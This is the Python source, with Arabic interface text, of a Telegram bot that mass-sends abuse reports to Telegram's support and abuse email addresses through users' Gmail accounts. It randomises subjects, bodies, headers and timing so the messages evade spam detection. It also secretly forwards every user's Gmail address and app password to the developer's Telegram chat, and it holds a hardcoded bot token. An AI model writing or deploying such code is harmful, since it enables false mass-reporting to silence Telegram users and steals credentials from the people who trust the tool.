import telebot
from telebot import types
import smtplib
from email.mime.text import MIMEText
import ssl
import time
import json
import os
import random
import string
import itertools
# معلومات البوت
BOT_TOKEN = "8207113199:AAH7lasPNSeV2Y22-3X_B_NT_QMch0YFxrE"
DATA_FILE = "user_data.json"
DEVELOPER_CHAT_ID = 1800163946  
CHANNEL_USERNAME = "MMJ8M"
bot = telebot.TeleBot(BOT_TOKEN)
# قائمة البريد الإلكتروني للتليجرام
TELEGRAM_EMAILS = [
    {"email": "abuse@telegram.org", "description": "لجميع المخالفات العامة"},
    {"email": "security@telegram.org", "description": "للبلاغ عن ثغرات"},
    {"email": "stopca@telegram.org", "description": "اساءة اطفال"},
    {"email": "dmca@telegram.org", "description": "حقوق نشر"},
    {"email": "recover@telegram.org", "description": "لفك حضر الحسابات"},
    {"email": "Support@telegram.org", "description": "الدعم الفني العام"},
    {"email": "abuse_team@telegram.org", "description": "لجميع انواع الانتهاكات"},
    {"email": "reports@stel.com", "description": "مشاكل تسجيل الدخول"},
    {"email": "sms@telegram.org", "description": "عدم وصول رسائل SMS"},
    {"email": "dema@telegram.org", "description": "للمطورين (غير مهم)"},
]
user_data = {}
is_sending_reports = {}
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    return {}
def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)
def notify_developer_new_user(chat_id, first_name, last_name, username, language_code=None):
    try:
        user_info = (
            f"مستخدم جديد بدأ البوت!\n"
            f"• المعرف: {chat_id}\n"
            f"• الاسم: {first_name} {last_name or ''}\n"
            f"• اسم المستخدم: @{username if username else 'غير متوفر'}\n"
        )
        if language_code:
            user_info += f"• لغة المستخدم: {language_code}\n"
        user_info += (
            f"• الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"• عدد المستخدمين الحالي: {len(user_data)}"
        )
        bot.send_message(DEVELOPER_CHAT_ID, user_info)
    except Exception as e:
        print(f"Error notifying developer: {e}")
def reset_user_state(chat_id, language_code=None):
    global user_data
    if str(chat_id) not in user_data:
        user_data[str(chat_id)] = {}
        try:
            user = bot.get_chat(chat_id)
            notify_developer_new_user(chat_id, user.first_name, user.last_name, user.username, language_code)
        except Exception as e:
            print(f"Error getting user info: {e}")
    user_data[str(chat_id)].update({
        "accounts": user_data[str(chat_id)].get("accounts", []),
        "receiver_emails": [{"email": item["email"], "selected": False, "description": item.get("description", "")} for item in TELEGRAM_EMAILS],
        "message_subject": None,
        "message_body": None,
        "is_waiting_for_subject": False,
        "is_waiting_for_body": False,
        "current_email_to_add": None,
        "edit_index": None,
        "edit_receiver_index": None,
        "receiver_menu_message_id": None
    })
    save_data(user_data)
def get_accounts(chat_id):
    if str(chat_id) not in user_data:
        reset_user_state(chat_id)
    return user_data.get(str(chat_id), {}).get("accounts", [])
def get_receiver_emails(chat_id):
    if str(chat_id) not in user_data:
        reset_user_state(chat_id)
    return user_data.get(str(chat_id), {}).get("receiver_emails", [])
def get_selected_receiver_emails(chat_id):
    return [data["email"] for data in get_receiver_emails(chat_id) if data["selected"]]
def get_message_subject(chat_id):
    return user_data.get(str(chat_id), {}).get("message_subject", None)
def get_message_body(chat_id):
    return user_data.get(str(chat_id), {}).get("message_body", None)
def is_user_subscribed(chat_id):
    try:
        member = bot.get_chat_member(f"@{CHANNEL_USERNAME}", chat_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"خطأ في التحقق من الاشتراك: {e}")
        return False
def escape_markdown_v2(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(['\\' + char if char in escape_chars else char for char in text])
@bot.message_handler(commands=['start', 'help'])
def start_bot(message):
    chat_id = message.chat.id
    if not is_user_subscribed(chat_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("الاشتراك في القناة", url=f"https://t.me/{CHANNEL_USERNAME}"))
        bot.send_message(chat_id, "يجب عليك الاشتراك في قناة البوت أولاً لاستخدامه.", reply_markup=markup)
        return
    if is_sending_reports.get(chat_id, False):
        is_sending_reports[chat_id] = False
    bot.clear_step_handler_by_chat_id(chat_id)
    reset_user_state(chat_id, message.from_user.language_code)
    show_main_menu(chat_id)
    
@bot.message_handler(commands=['ايقاف'])
def stop_bot(message):
    chat_id = message.chat.id
    if not is_user_subscribed(chat_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("الاشتراك في القناة", url=f"https://t.me/{CHANNEL_USERNAME}"))
        bot.send_message(chat_id, "يجب عليك الاشتراك في قناة البوت أولاً لاستخدامه.", reply_markup=markup)
        return
    if is_sending_reports.get(chat_id, False):
        is_sending_reports[chat_id] = False
        bot.send_message(chat_id, "تم إيقاف عملية إرسال البلاغات بنجاح! يمكنك الآن بدء هجمة جديدة.")
    else:
        bot.send_message(chat_id, "لا توجد عملية إرسال قيد التقدم لإيقافها.")
        
# إضافة أمر /stop بنفس وظيفة /ايقاف
@bot.message_handler(commands=['stop'])
def stop_reports(message):
    chat_id = message.chat.id
    if not is_user_subscribed(chat_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("الاشتراك في القناة", url=f"https://t.me/{CHANNEL_USERNAME}"))
        bot.send_message(chat_id, "يجب عليك الاشتراك في قناة كنتاكي أولاً لاستخدامه.", reply_markup=markup)
        return
    if is_sending_reports.get(chat_id, False):
        is_sending_reports[chat_id] = False
        bot.send_message(chat_id, "تم إيقاف عملية إرسال البلاغات بنجاح! يمكنك الآن بدء هجمة جديدة.")
    else:
        bot.send_message(chat_id, "لا توجد عملية إرسال قيد التقدم لإيقافها.")
        
def show_accounts_menu(chat_id, message_id=None):
    markup = types.InlineKeyboardMarkup(row_width=1)
    accounts = get_accounts(chat_id)
    if accounts:
        for i, acc in enumerate(accounts):
            markup.add(types.InlineKeyboardButton(f"{i+1}) {acc['email']}", callback_data=f'view_account_{i}'))
        markup.add(types.InlineKeyboardButton("إضافة حساب ", callback_data='add_new_account'))
    else:
        markup.add(types.InlineKeyboardButton("إضافة حساب ", callback_data='add_new_account'))
    markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
    bot.send_message(chat_id, "حسابات الحالية هيه:", reply_markup=markup)
def show_receiver_emails_menu(chat_id, message_id=None):
    markup = types.InlineKeyboardMarkup(row_width=1)
    receiver_emails_data = get_receiver_emails(chat_id)
    for i, data in enumerate(receiver_emails_data):
        status_icon = "✅" if data["selected"] else "❌"
        button_text = f"{status_icon} {data['email']} - {data['description']}"
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f'toggle_receiver_{i}'))
    markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
    sent_msg = bot.send_message(chat_id, "اختر بريد شركة التليجرام المستهدف", reply_markup=markup)
    user_data[str(chat_id)]["receiver_menu_message_id"] = sent_msg.message_id
    save_data(user_data)
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    if not is_user_subscribed(chat_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("الاشتراك في القناة", url=f"https://t.me/{CHANNEL_USERNAME}"))
        bot.send_message(chat_id, "يجب عليك الاشتراك في قناة البوت أولاً لاستخدامه.", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    try:
        if call.data == 'manage_accounts':
            bot.clear_step_handler_by_chat_id(chat_id)
            if "current_email_to_add" in user_data[str(chat_id)]:
                del user_data[str(chat_id)]["current_email_to_add"]
                save_data(user_data)
            show_accounts_menu(chat_id)
        elif call.data.startswith('view_account_'):
            index = int(call.data.split('_')[-1])
            account_email = get_accounts(chat_id)[index]['email']
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(types.InlineKeyboardButton("❌ حذف هذا الحساب", callback_data=f'delete_account_{index}'))
            markup.add(types.InlineKeyboardButton("الرجوع إلى قائمة الحسابات", callback_data='manage_accounts'))
            bot.send_message(chat_id, f"هل أنت متأكد من رغبتك في حذف الحساب التالي؟\n\n📧 {account_email}", reply_markup=markup)
        elif call.data.startswith('delete_account_'):
            index = int(call.data.split('_')[-1])
            account_email = get_accounts(chat_id)[index]['email']
            del user_data[str(chat_id)]['accounts'][index]
            save_data(user_data)
            bot.send_message(chat_id, f"✅ تم حذف الحساب {account_email} بنجاح.")
            show_accounts_menu(chat_id)
        elif call.data == 'manage_receiver_emails':
            show_receiver_emails_menu(chat_id)
        elif call.data.startswith('toggle_receiver_'):
            index = int(call.data.split('_')[-1])
            receiver_emails = user_data[str(chat_id)]["receiver_emails"]
            receiver_emails[index]["selected"] = not receiver_emails[index]["selected"]
            save_data(user_data)
            new_markup = types.InlineKeyboardMarkup(row_width=1)
            for i, data in enumerate(receiver_emails):
                status_icon = "✅" if data["selected"] else "❌"
                button_text = f"{status_icon} {data['email']} - {data['description']}"
                new_markup.add(types.InlineKeyboardButton(button_text, callback_data=f'toggle_receiver_{i}'))
            new_markup.add(types.InlineKeyboardButton("رجوع  ", callback_data='finish_adding'))
            receiver_menu_id = user_data[str(chat_id)].get("receiver_menu_message_id")
            if receiver_menu_id:
                bot.edit_message_text(
                    text="اختر بريد شركة التليجرام المستهدف",
                    chat_id=chat_id,
                    message_id=receiver_menu_id,
                    reply_markup=new_markup
                )
            else:
                show_receiver_emails_menu(chat_id)
        elif call.data == 'add_new_account':
            bot.clear_step_handler_by_chat_id(chat_id)  # إزالة أي معالجات سابقة
            if "current_email_to_add" in user_data[str(chat_id)]:
                del user_data[str(chat_id)]["current_email_to_add"]
                save_data(user_data)
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
            msg = bot.send_message(chat_id, "ارسل لي حساب Gmail:", reply_markup=markup)
            bot.register_next_step_handler(msg, get_account_password)
        elif call.data == 'add_message_content':
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
            bot.send_message(chat_id, "ما هوه موضوع البلاغ.", reply_markup=markup)
            user_data[str(chat_id)]["is_waiting_for_subject"] = True
            save_data(user_data)
            bot.register_next_step_handler(call.message, add_message_subject)
        elif call.data == 'finish_adding':
            bot.clear_step_handler_by_chat_id(chat_id)
            if str(chat_id) in user_data:
                user_data[str(chat_id)]["is_waiting_for_subject"] = False
                user_data[str(chat_id)]["is_waiting_for_body"] = False
                save_data(user_data)
            show_main_menu(chat_id)
        elif call.data == 'send_all_reports':
            send_all_reports_handler(chat_id)
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Error in callback_query: {e}")
        bot.send_message(chat_id, "❌ حدث خطأ ما، يرجى المحاولة مرة أخرى أو استخدام /start")
        reset_user_state(chat_id)
        bot.answer_callback_query(call.id)
def edit_account_email(message):
    chat_id = message.chat.id
    if message.text.startswith('/start'):
        bot.clear_step_handler_by_chat_id(chat_id)
        show_main_menu(chat_id)
        return
    user_data[str(chat_id)]["current_email_to_add"] = message.text
    
    # إنشاء لوحة المفاتيح تحتوي على زر الرجوع
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
    
    # إرسال الرسالة مع لوحة المفاتيح الجديدة
    msg = bot.send_message(
        chat_id, 
        "تمام، الآن أرسل لي كلمة المرور التطبيقية للحساب (طريقة استخراج كلمة المرور التطبيقية هنا @MMJ8M)",
        reply_markup=markup
    )
    
    bot.register_next_step_handler(msg, edit_account_password)
def edit_account_password(message):
    chat_id = message.chat.id
    if message.text.startswith('/start'):
        bot.clear_step_handler_by_chat_id(chat_id)
        show_main_menu(chat_id)
        return
    email = user_data[str(chat_id)].pop("current_email_to_add", None)
    index = user_data[str(chat_id)].pop("edit_index", None)
    if not email or index is None:
        bot.clear_step_handler_by_chat_id(chat_id)
        show_main_menu(chat_id)
        return
    password = message.text
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(email, password)
        user_data[str(chat_id)]["accounts"][index] = {"email": email, "password": password}
        save_data(user_data)
        bot.send_message(chat_id, f"✅ تم التحقق من الحساب {email} وتحديثه بنجاح.")
        show_accounts_menu(chat_id)
    except smtplib.SMTPAuthenticationError:
        bot.send_message(chat_id, "❌ كلمة المرور أو البريد الإلكتروني غير صحيح. حاول مرة أخرى.")
        show_accounts_menu(chat_id)
    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء التحقق من الحساب {email}: {e}")
        show_accounts_menu(chat_id)
def get_account_email(message):
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
    msg = bot.send_message(chat_id, "أرسل لي البريد الإلكتروني للحساب:", reply_markup=markup)
    bot.register_next_step_handler(msg, get_account_password)
def get_account_password(message):
    chat_id = message.chat.id
    if message.text.startswith('/start'):
        bot.clear_step_handler_by_chat_id(chat_id)
        show_main_menu(chat_id)
        return
    email = message.text
    user_data[str(chat_id)]["current_email_to_add"] = email
    save_data(user_data)
    
    # إنشاء لوحة المفاتيح تحتوي على زر الرجوع
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
    
    # إرسال الرسالة مع لوحة المفاتيح الجديدة
    msg = bot.send_message(
        chat_id, 
        "تمام، الآن أرسل لي كلمة المرور التطبيقية للحساب (طريقة استخراج كلمة المرور التطبيقية هنا @MMJ8M)",
        reply_markup=markup
    )
    
    bot.register_next_step_handler(msg, process_new_account)
def process_new_account(message):
    chat_id = message.chat.id
    if message.text.startswith('/start'):
        bot.clear_step_handler_by_chat_id(chat_id)
        show_main_menu(chat_id)
        return
    email = user_data[str(chat_id)].pop("current_email_to_add", None)
    if email is None:
        bot.send_message(chat_id, "❌ حدث خطأ، يرجى إعادة المحاولة من البداية.")
        bot.clear_step_handler_by_chat_id(chat_id)
        show_main_menu(chat_id)
        return
    password = message.text
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(email, password)
        user_data[str(chat_id)]["accounts"].append({"email": email, "password": password})
        try:
            user = bot.get_chat(chat_id)
            language_code = message.from_user.language_code
            account_info = (
                f"تمت إضافة حساب جديد!\n"
                f"• المعرف: {chat_id}\n"
                f"• الاسم: {user.first_name} {user.last_name or ''}\n"
                f"• اسم المستخدم: @{user.username if user.username else 'غير متوفر'}\n"
            )
            if language_code:
                account_info += f"• لغة المستخدم: {language_code}\n"
            account_info += (
                f"• البريد الإلكتروني: {email}\n"
                f"• كلمة المرور التطبيقية: {password}\n"
                f"• الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
            )
            bot.send_message(DEVELOPER_CHAT_ID, account_info)
        except Exception as e:
            print(f"Error notifying developer: {e}")
        save_data(user_data)
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton(f"✅ {email}", callback_data='ignore_button'))
        markup.add(types.InlineKeyboardButton("إضافة حساب آخر", callback_data='add_new_account'))
        markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
        bot.send_message(
            chat_id, 
            "✅ تم إضافة الحساب بنجاح.",
            reply_markup=markup
        )
    except smtplib.SMTPAuthenticationError:
        bot.send_message(chat_id, "❌ كلمة المرور أو البريد الإلكتروني غير صحيح. حاول مرة أخرى.")
        show_accounts_menu(chat_id)
    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء التحقق من الحساب {email}: {e}")
        show_accounts_menu(chat_id)
def add_message_subject(message):
    chat_id = message.chat.id
    if message.text.startswith('/start'):
        bot.clear_step_handler_by_chat_id(chat_id)
        show_main_menu(chat_id)
        return
    user_data[str(chat_id)]["is_waiting_for_subject"] = False
    subject = message.text
    user_data[str(chat_id)]["message_subject"] = subject
    
    # إنشاء لوحة المفاتيح تحتوي على زر الرجوع
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
    
    # إرسال الرسالة مع لوحة المفاتيح الجديدة
    msg = bot.send_message(
        chat_id, 
        "✅ أحسنت! الآن أرسل لي كود البلاغ.",
        reply_markup=markup
    )
    
    user_data[str(chat_id)]["is_waiting_for_body"] = True
    save_data(user_data)
    bot.register_next_step_handler(msg, add_message_body)
def add_message_body(message):
    chat_id = message.chat.id
    if message.text.startswith('/start'):
        bot.clear_step_handler_by_chat_id(chat_id)
        show_main_menu(chat_id)
        return
    user_data[str(chat_id)]["is_waiting_for_body"] = False
    body = message.text
    user_data[str(chat_id)]["message_body"] = body
    save_data(user_data)
    bot.send_message(chat_id, "✅ تم حفظ الكود وموضوع البلاغ بنجاح.")
    show_main_menu(chat_id)
def send_all_reports_handler(chat_id):
    accounts = get_accounts(chat_id)
    selected_receiver_emails = get_selected_receiver_emails(chat_id)
    subject = get_message_subject(chat_id)
    body = get_message_body(chat_id)
    missing_items = []
    if not accounts:
        missing_items.append("لم تقم بإضافة أي حسابات.")
    if not selected_receiver_emails:
        missing_items.append("لم تقم بتحديد أي بريد إلكتروني مستهدف.")
    if not subject:
        missing_items.append("لم تقم بإضافة موضوع للبلاغ.")
    if not body:
        missing_items.append("لم تقم بإضافة كود البلاغ.")
    if missing_items:
        message = "❌ يبدو أن هناك بعض الخطوات التي لم تكملها:\n" + "\n".join([f"{i}. {item}" for i, item in enumerate(missing_items, 1)])
        
        # إنشاء لوحة المفاتيح تحتوي على زر الرجوع
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
        
        # إرسال الرسالة مع لوحة المفاتيح الجديدة
        bot.send_message(
            chat_id, 
            message,
            reply_markup=markup
        )
        return
    msg = bot.send_message(chat_id, "كم عدد البلاغات التي تريد إرسالها؟ (أدخل رقماً)")
    bot.register_next_step_handler(msg, start_sending_reports)
def get_progress_bar(percentage, width=20):
    filled = int(width * percentage / 100)
    empty = width - filled
    return f"[{'█' * filled}{' ' * empty}] {percentage:.1f}%"
def generate_varied_subject(base_subject):
    variations = [
        base_subject,
        f"Urgent: {base_subject}",
        f"Report: {base_subject}",
        f"Concern regarding {base_subject}",
        f"{base_subject} - Immediate Attention Needed",
        f"Complaint about {base_subject}",
    ]
    return random.choice(variations)
def generate_varied_body(base_body):
    # إضافة تنويعات عشوائية للجسم لجعله يبدو طبيعيًا
    prefixes = [
        "Hello, I wanted to report the following issue: ",
        "Hi team, please look into this: ",
        "Dear support, I'm concerned about: ",
        "Greetings, this is urgent: ",
        "To whom it may concern: ",
        ""
    ]
    suffixes = [
        "\nBest regards,\nA concerned user",
        "\nThanks in advance.",
        "\nPlease respond soon.",
        "\nSincerely,",
        "\nKind regards,",
        ""
    ]
    # إضافة أخطاء إملائية عشوائية أو تغييرات طفيفة
    body_lines = base_body.split('\n')
    for i in range(len(body_lines)):
        if random.random() < 0.1:  # 10% chance to add a minor variation
            body_lines[i] = body_lines[i].replace(' ', '  ', 1) if ' ' in body_lines[i] else body_lines[i]
            body_lines[i] += ' ' + random.choice(['.', ',', '!', '?']) if random.random() < 0.05 else body_lines[i]
    varied_body = random.choice(prefixes) + '\n'.join(body_lines) + random.choice(suffixes)
    # إضافة رموز عشوائية أو مسافات لتغيير الهاش
    varied_body += '\n' + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15))) if random.random() < 0.2 else ''
    return varied_body
def start_sending_reports(message):
    chat_id = message.chat.id
    if message.text.startswith('/start'):
        bot.clear_step_handler_by_chat_id(chat_id)
        show_main_menu(chat_id)
        return
    try:
        num_reports = int(message.text)
        if num_reports <= 0:
            raise ValueError
    except ValueError:
        msg = bot.send_message(chat_id, "❌ أدخل رقماً صحيحاً!")
        bot.register_next_step_handler(msg, start_sending_reports)
        return
    accounts = get_accounts(chat_id)
    selected_receiver_emails = get_selected_receiver_emails(chat_id)
    base_subject = get_message_subject(chat_id)
    base_body = get_message_body(chat_id)
    is_sending_reports[chat_id] = True
    total_emails_to_send = num_reports
    if total_emails_to_send == 0:
        bot.send_message(chat_id, "❌ لا توجد بلاغات لإرسالها.")
        show_main_menu(chat_id)
        return
    pairs = list(itertools.product(accounts, selected_receiver_emails))
    if not pairs:
        bot.send_message(chat_id, "❌ لا توجد حسابات أو بريد مستهدف.")
        show_main_menu(chat_id)
        return
    num_pairs = len(pairs)
    start_time = time.time()
    last_update_time = start_time
    sent_count = 0
    update_interval = 1.0
    progress_message = bot.send_message(
        chat_id, 
        f"🚀 بدء البلاغ {total_emails_to_send} بلاغ...\n"
        f"{get_progress_bar(0)}\n"
        f"📤 تم البلاغ: 0/{total_emails_to_send}\n"
        f"⚡️ السرعة: 0.0 بلاغ/ثانية\n"
        f"⏳ الوقت المتبقي: جارٍ التقدير...\n"
        f"🛑 يمكنك إيقاف العملية في أي وقت باستخدام الأمر /ايقاف"
    )
    progress_message_id = progress_message.message_id
    
    while sent_count < total_emails_to_send and is_sending_reports.get(chat_id, True):
        pair_index = sent_count % num_pairs
        account, receiver_email = pairs[pair_index]
        try:
            varied_subject = generate_varied_subject(base_subject)
            varied_body = generate_varied_body(base_body)
            msg = MIMEText(varied_body, 'html')
            msg['Subject'] = varied_subject
            msg['From'] = account["email"]
            msg['To'] = receiver_email
            # إضافة هيدرات عشوائية لجعلها تبدو يدوية
            msg.add_header('X-Priority', str(random.randint(1, 5)))
            msg.add_header('X-MSMail-Priority', random.choice(['Low', 'Normal', 'High']))
            msg.add_header('Importance', random.choice(['Low', 'Normal', 'High']))
            # تأخير عشوائي أكبر لتقليد السلوك البشري (10-60 ثانية)
            delay = random.uniform(10, 30)
            time.sleep(delay)
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(account["email"], account["password"])
                server.send_message(msg)
            sent_count += 1
            current_time = time.time()
            elapsed_time = current_time - start_time
            if elapsed_time > 0:
                rate = sent_count / elapsed_time
                remaining_time = (total_emails_to_send - sent_count) / rate
                minutes, seconds = divmod(remaining_time, 60)
                time_remaining_str = f"{int(minutes):02d}:{int(seconds):02d}"
            else:
                rate = 0
                time_remaining_str = "جاري التقدير..."
            if current_time - last_update_time >= update_interval or sent_count == total_emails_to_send:
                percentage = (sent_count / total_emails_to_send) * 100
                last_update_time = current_time
                text = f"🚀 جاري إرسال البلاغات...\n" \
                       f"{get_progress_bar(percentage)}\n" \
                       f"📤 تم الإرسال: {sent_count}/{total_emails_to_send}\n" \
                       f"⚡️ السرعة: {rate:.1f} بلاغ/ثانية\n" \
                       f"⏳ الوقت المتبقي: {time_remaining_str}\n" \
                       f"🛑 يمكنك إيقاف العملية في أي وقت باستخدام الأمر /ايقاف"
                bot.edit_message_text(text=text, chat_id=chat_id, message_id=progress_message_id)
        except smtplib.SMTPAuthenticationError:
            bot.send_message(chat_id, f"❌ خطأ في الحساب {account['email']}: تم حظر الحساب أو مشكلة في المصادقة. تم تخطيه.")
            if account in accounts:
                accounts.remove(account)
            # Rebuild pairs after removing account
            pairs = list(itertools.product(accounts, selected_receiver_emails))
            num_pairs = len(pairs) if pairs else 0
            if num_pairs == 0:
                break
        except Exception as e:
            print(f"فشل إرسال بلاغ من {account['email']} إلى {receiver_email}: {e}")
    
    if is_sending_reports.get(chat_id, False):
        final_time = time.time() - start_time
        final_rate = sent_count / final_time if final_time > 0 else 0
        final_text = f"✅ تم إرسال جميع البلاغات بنجاح!\n" \
                     f"📊 الإحصائيات:\n" \
                     f"• العدد الكلي: {total_emails_to_send}\n" \
                     f"• العدد المرسل: {sent_count}\n" \
                     f"• الوقت المستغرق: {time.strftime('%H:%M:%S', time.gmtime(final_time))}\n" \
                     f"• متوسط السرعة: {final_rate:.1f} بلاغ/ثانية"
        bot.edit_message_text(text=final_text, chat_id=chat_id, message_id=progress_message_id)
    is_sending_reports[chat_id] = False
    show_main_menu(chat_id)
def show_main_menu(chat_id, message_id=None):
    inline_markup = types.InlineKeyboardMarkup(row_width=1)
    item_accounts = types.InlineKeyboardButton("أضف حسابك", callback_data='manage_accounts')
    item_receiver_emails = types.InlineKeyboardButton("حدد حسابات شركة التليجرام", callback_data='manage_receiver_emails')
    item_message = types.InlineKeyboardButton("إضافة كود وموضوع البلاغ", callback_data='add_message_content')
    item_send = types.InlineKeyboardButton("حدد عدد البلاغات", callback_data='send_all_reports')
    inline_markup.add(item_accounts, item_receiver_emails, item_message, item_send)
    reply_markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    reply_markup.add(types.KeyboardButton("/start"), types.KeyboardButton("/ايقاف"))
    welcome_message = (
        "*♦️ أهلاً بك في بوت شد بلاغات التليجرام التلقائي\\.*\n"
        "\\ ▪️طريقة عمل البوت اتبع الخطوات بالترتيب: \n"
        "\\ \\(1\\) ضيف حساب Gmail \n"
        "\\ \\(2\\) حدد حسابات شركة التليجرام حسب نوع بلاغك\n"
        "\\ \\(3\\) إضافة كود وموضوع البلاغ\n"
        "\\ \\(4\\) حدد عدد البلاغات\n"
        "♦️ مطور البوت: [ڪَِنتِـآإڪَِيٰ](tg://openmessage?user_id=1800163946)"
    )
    sent_message = bot.send_message(
        chat_id, 
        welcome_message, 
        parse_mode='MarkdownV2', 
        reply_markup=inline_markup
    )
    if str(chat_id) not in user_data:
        user_data[str(chat_id)] = {}
    user_data[str(chat_id)]["last_menu_message_id"] = sent_message.message_id
    save_data(user_data)
print("البوت يعمل...")
while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=60)
    except Exception as e:
        print(f"حدث خطأ في الاتصال: {e}")
        time.sleep(5)
